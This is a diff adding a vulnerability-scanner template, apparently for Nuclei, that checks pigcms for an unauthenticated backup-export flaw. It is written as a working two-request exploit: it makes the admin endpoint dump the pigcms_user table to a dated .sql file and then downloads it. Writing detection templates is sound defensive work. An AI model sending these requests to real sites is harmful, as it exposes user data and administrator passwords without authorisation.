@@ -1,0 +1,50 @@
+id: pigcms-action-export-file-download
+info:
+  name: pigcms action_export File Download Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    pigcms is a management system designed to provide customers with WeChat marketing. The action_export function of the pigcms system allows unauthorized downloading of backup files, enabling attackers to obtain sensitive information like administrator passwords.
+  tags: file-read, pigcms
+  reference:
+    - https://xz.aliyun.com/t/10470
+
+variables:
+  current_year: "{{date_time('%Y')}}"
+  current_month: "{{date_time('%m')}}"
+  current_day: "{{date_time('%d')}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: generate-sql-file
+    method: POST
+    path:
+      - "/cms/manage/admin.php?m=manage&c=database&a=action_export"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "tables[]=pigcms_user&sizelimit=10&fileId1&random=&tableId=startfrom="
+    matchers:
+      - type: regex
+        regex:
+          - "((\\d|_)*?)\\.sql"
+        part: body
+    extractors:
+      - type: regex
+        group: 1
+        regex:
+          - "((\\d|_)*?)\\.sql"
+        part: body
+        internal: true
+
+  - id: download-sql-file
+    method: GET
+    path:
+      - "/cms/backup/data{{current_year}}-{{current_month}}-{{current_day}}/{{generate-sql-file}}.sql"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "pigcms_user"
+    matchers-condition: and
